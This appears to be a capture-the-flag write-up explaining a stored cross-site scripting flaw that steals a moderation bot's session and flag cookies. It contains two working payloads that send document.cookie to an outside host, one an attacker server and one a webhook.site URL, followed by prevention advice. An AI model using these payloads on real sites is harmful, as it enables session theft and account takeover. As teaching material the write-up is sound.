# Stored XSS: stealing the moderation bot's session

**OWASP category:** A03:2021 – Injection (Cross-Site Scripting)

## How it works
Forum post content is stored and later shown without escaping. So any HTML or JS we
post runs in the browser of everyone who views it. A moderation bot opens new posts
within a minute, so our script runs in the bot's browser. The session cookie is not
HttpOnly, so JS can read it with `document.cookie`. The bot also has a `flag`
cookie. If we send its cookies to a server we control, we get its session and the
flag.

## How I exploited it
1. Start a small HTTP collector on the attack box.
2. Log in, then `POST /forum/new` with
   `<script>new Image().src='http://<me>/?c='+document.cookie</script>`.
3. The bot opens the post and its browser sends its cookies to our collector. The
   `flag` cookie comes with the session.

For a quick by-hand demo you can skip the local collector and use a `webhook.site`
URL instead:
```html
<script>fetch("https://webhook.site/<your-id>?c=" + encodeURIComponent(document.cookie))</script>
```
Same idea, the cookie just lands on the webhook page instead of our own server.

## Impact
We steal the session of a privileged viewer (the bot): account takeover and any
action as that user. Stored XSS hits every viewer on its own, no link needed.

## How it could have been prevented
- Escape all user content on render. Use a template layer that escapes by default.
- Set the session cookie `HttpOnly` so JS cannot read it.
- Add a Content-Security-Policy to block inline and injected scripts.
